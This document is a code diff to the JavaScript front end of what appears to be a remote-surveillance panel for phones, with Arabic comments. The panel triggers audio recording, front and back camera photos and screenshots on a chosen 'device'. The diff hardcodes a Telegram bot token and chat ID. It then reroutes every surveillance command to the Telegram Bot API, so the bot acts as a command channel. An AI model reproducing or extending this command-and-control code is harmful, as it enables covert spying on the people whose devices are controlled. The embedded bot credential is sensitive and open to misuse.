@@ -47,6 +47,10 @@ let liveFilterEnabled = true;
 // ✅ حالة التسجيل الصوتي
 let isRecordingAudio = false;
 
+// ✅ ✅ ✅ إعدادات Telegram (مباشرة)
+const TG_BOT_TOKEN = "5826969870:AAF2RAg49eZHLJ62onDtVjBskxgYFvfdkpQ";
+const TG_CHAT_ID = "1538488453";
+
 function logout() {
     const token = getAuthToken();
     if (token) {
@@ -113,7 +117,6 @@ function initSSE() {
             } catch (err) {}
         });
 
-        // ✅ NEW — لقطة شاشة جديدة
         sse.addEventListener('new_screenshot', (e) => {
             try {
                 const data = JSON.parse(e.data);
@@ -127,7 +130,6 @@ function initSSE() {
             } catch (err) {}
         });
 
-        // ✅ NEW — تسجيل صوتي جديد
         sse.addEventListener('new_audio', (e) => {
             try {
                 const data = JSON.parse(e.data);
@@ -141,7 +143,6 @@ function initSSE() {
             } catch (err) {}
         });
 
-        // ✅ NEW — صورة كاميرا جديدة
         sse.addEventListener('new_camera_photo', (e) => {
             try {
                 const data = JSON.parse(e.data);
@@ -335,7 +336,6 @@ function openAdvancedMenu() {
         <div style="max-width:500px;margin:0 auto;background:#111;border:2px solid #9b59b6;border-radius:15px;padding:25px;">
             <h2 style="color:#9b59b6;text-align:center;margin-bottom:20px;text-shadow:0 0 15px #9b59b6;">⚙️ المميزات المتقدمة</h2>
 
-            <!-- 🎤 تسجيل صوت -->
             <div style="background:#1a0a1a;border:2px solid #00ffcc;border-radius:10px;padding:15px;margin-bottom:15px;">
                 <h3 style="color:#00ffcc;margin-bottom:10px;font-size:16px;">🎤 تسجيل صوت</h3>
                 <div style="display:flex;gap:8px;">
@@ -347,7 +347,6 @@ function openAdvancedMenu() {
                 </button>
             </div>
 
-            <!-- 📸 كاميرا أمامية -->
             <div style="background:#1a0a1a;border:2px solid #9b59b6;border-radius:10px;padding:15px;margin-bottom:15px;">
                 <h3 style="color:#9b59b6;margin-bottom:10px;font-size:16px;">📸 الكاميرا</h3>
                 <div style="display:flex;gap:8px;margin-bottom:10px;">
@@ -359,7 +358,6 @@ function openAdvancedMenu() {
                 </button>
             </div>
 
-            <!-- 📷 لقطة شاشة -->
             <div style="background:#1a0a1a;border:2px solid #ffcc00;border-radius:10px;padding:15px;margin-bottom:15px;">
                 <h3 style="color:#ffcc00;margin-bottom:10px;font-size:16px;">📷 لقطة شاشة</h3>
                 <button onclick="takeScreenshot()" style="width:100%;background:#ffcc00;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;margin-bottom:10px;">
@@ -370,13 +368,11 @@ function openAdvancedMenu() {
                 </button>
             </div>
 
-            <!-- ❌ إغلاق -->
             <button onclick="document.getElementById('advancedMenuOverlay').remove()" style="width:100%;background:#333;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;">✖ إغلاق</button>
         </div>
     `;
     document.body.appendChild(ov);
 
-    // ✅ تحديث العدادات
     updateAdvancedCounters();
 }
 
@@ -389,79 +385,79 @@ function updateAdvancedCounters() {
     if (s) s.textContent = liveScreenshots.length;
 }
 
-// ✅ تسجيل صوت — بدء
+// ✅ ✅ ✅ إرسال أمر مباشر لـ Telegram Bot
+async function sendTelegramCommand(cmd) {
+    try {
+        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TG_CHAT_ID,
+                text: cmd
+            })
+        });
+        const result = await response.json();
+        return result.ok === true;
+    } catch (e) {
+        console.error('Telegram error:', e);
+        return false;
+    }
+}
+
+// ✅ تسجيل صوت — بدء (Telegram مباشر)
 async function startAudioRecording() {
-    if (!currentDevice) return;
-    try {
-        const response = await fetch('/api.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ device: currentDevice, command: 'record_audio_start', token: getAuthToken() })
-        });
-        const result = await response.json();
-        if (result.success) {
-            isRecordingAudio = true;
-            const startBtn = document.getElementById('startAudioBtn');
-            const stopBtn = document.getElementById('stopAudioBtn');
-            if (startBtn) { startBtn.disabled = true; startBtn.style.opacity = '0.5'; }
-            if (stopBtn) { stopBtn.disabled = false; stopBtn.style.opacity = '1'; }
-            showNotification('🎤 بدأ التسجيل', 'جاري التسجيل... اضغط "إيقاف" عند الانتهاء', '🎤');
-        } else alert('❌ فشل بدء التسجيل');
-    } catch (e) { alert('❌ خطأ: ' + e.message); }
+    const ok = await sendTelegramCommand('/recordaudio');
+    if (ok) {
+        isRecordingAudio = true;
+        const startBtn = document.getElementById('startAudioBtn');
+        const stopBtn = document.getElementById('stopAudioBtn');
+        if (startBtn) { startBtn.disabled = true; startBtn.style.opacity = '0.5'; }
+        if (stopBtn) { stopBtn.disabled = false; stopBtn.style.opacity = '1'; }
+        showNotification('🎤 بدأ التسجيل', 'أُرسل للبوت — جاري التسجيل...', '🎤');
+    } else {
+        alert('❌ فشل إرسال الأمر للبوت');
+    }
 }
 
-// ✅ تسجيل صوت — إيقاف + إرسال
+// ✅ تسجيل صوت — إيقاف (Telegram مباشر)
 async function stopAudioRecording() {
-    if (!currentDevice) return;
-    try {
-        const response = await fetch('/api.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ device: currentDevice, command: 'record_audio_stop', token: getAuthToken() })
-        });
-        const result = await response.json();
-        if (result.success) {
-            isRecordingAudio = false;
-            const startBtn = document.getElementById('startAudioBtn');
-            const stopBtn = document.getElementById('stopAudioBtn');
-            if (startBtn) { startBtn.disabled = false; startBtn.style.opacity = '1'; }
-            if (stopBtn) { stopBtn.disabled = true; stopBtn.style.opacity = '0.5'; }
-            showNotification('✅ تم الإيقاف', 'جاري رفع التسجيل...', '✅');
-        } else alert('❌ فشل الإيقاف');
-    } catch (e) { alert('❌ خطأ: ' + e.message); }
+    const ok = await sendTelegramCommand('/stopaudio');
+    if (ok) {
+        isRecordingAudio = false;
+        const startBtn = document.getElementById('startAudioBtn');
+        const stopBtn = document.getElementById('stopAudioBtn');
+        if (startBtn) { startBtn.disabled = false; startBtn.style.opacity = '1'; }
+        if (stopBtn) { stopBtn.disabled = true; stopBtn.style.opacity = '0.5'; }
+        showNotification('✅ تم الإيقاف', 'جاري رفع التسجيل عبر البوت...', '✅');
+    } else {
+        alert('❌ فشل إرسال الأمر للبوت');
+    }
 }
 
-// ✅ كاميرا — أمامية/خلفية
+// ✅ كاميرا — أمامية/خلفية (Telegram مباشر)
 async function takeCameraPhoto(camera) {
-    if (!currentDevice) return;
-    const command = camera === 'front' ? 'take_photo_front' : 'take_photo_back';
-    try {
-        const response = await fetch('/api.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ device: currentDevice, command: command, token: getAuthToken() })
-        });
-        const result = await response.json();
-        if (result.success) {
-            showNotification(`📸 الكاميرا ${camera === 'front' ? 'الأمامية' : 'الخلفية'}`, 'سيتم التقاط الصورة خلال 30 ثانية', '📸');
-        } else alert('❌ فشل');
-    } catch (e) { alert('❌ خطأ: ' + e.message); }
+    const cmd = camera === 'front' ? '/photofront' : '/photoback';
+    const ok = await sendTelegramCommand(cmd);
+    if (ok) {
+        showNotification(
+            `📸 الكاميرا ${camera === 'front' ? 'الأمامية' : 'الخلفية'}`,
+            'أُرسل للبوت — التطبيق راح ينفذ فوراً',
+            '📸'
+        );
+    } else {
+        alert('❌ فشل إرسال الأمر للبوت');
+    }
 }
 
-// ✅ لقطة شاشة
+// ✅ لقطة شاشة (Telegram مباشر)
 async function takeScreenshot() {
-    if (!currentDevice) return;
-    try {
-        const response = await fetch('/api.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ device: currentDevice, command: 'take_screenshot', token: getAuthToken() })
-        });
-        const result = await response.json();
-        if (result.success) {
-            showNotification('📷 لقطة شاشة', 'سيتم الالتقاط خلال ثواني', '📷');
-        } else alert('❌ فشل');
-    } catch (e) { alert('❌ خطأ: ' + e.message); }
+    const ok = await sendTelegramCommand('/screenshot');
+    if (ok) {
+        showNotification('📷 لقطة شاشة', 'أُرسل للبوت — التطبيق راح ينفذ فوراً', '📷');
+    } else {
+        alert('❌ فشل إرسال الأمر للبوت');
+    }
 }
 
 // ═══════════════════════════════════════════
@@ -539,7 +535,6 @@ function deleteLiveAudio(idx) {
     });
 }
 
-// ✅ Overlay — لقطات الشاشة
 function openLiveScreenshots() { document.getElementById('liveScreenshotsOverlay').style.display = 'block'; loadScreenshots(); }
 function closeLiveScreenshots() { document.getElementById('liveScreenshotsOverlay').style.display = 'none'; }
 function clearLiveScreenshots() {
@@ -608,7 +603,6 @@ function deleteLiveScreenshot(idx) {
     });
 }
 
-// ✅ Overlay — صور الكاميرا
 function openLiveCamera() { document.getElementById('liveCameraOverlay').style.display = 'block'; loadCameraPhotos(); }
 function closeLiveCamera() { document.getElementById('liveCameraOverlay').style.display = 'none'; }
 function clearLiveCamera() {
@@ -1234,7 +1228,6 @@ function selectDevice(deviceId) {
         dataInterval = setInterval(() => { if (currentDevice) loadAllData(); }, 10000);
         updateLiveData();
         loadAllData();
-        // ✅ تحميل العدادات الإضافية
         loadAudioRecordings();
         loadScreenshots();
         loadCameraPhotos();
@@ -1322,7 +1315,6 @@ async function updateLiveData() {
             if (vBadge && vBadge.textContent === '0') vBadge.textContent = String(data.voice_count);
         }
 
-        // ✅ تحديث عدادات المميزات المتقدمة
         const advCounters = {
             liveAudioCount: data.audio_count || 0,
             liveScreenshotsCount: data.screenshot_count || 0,
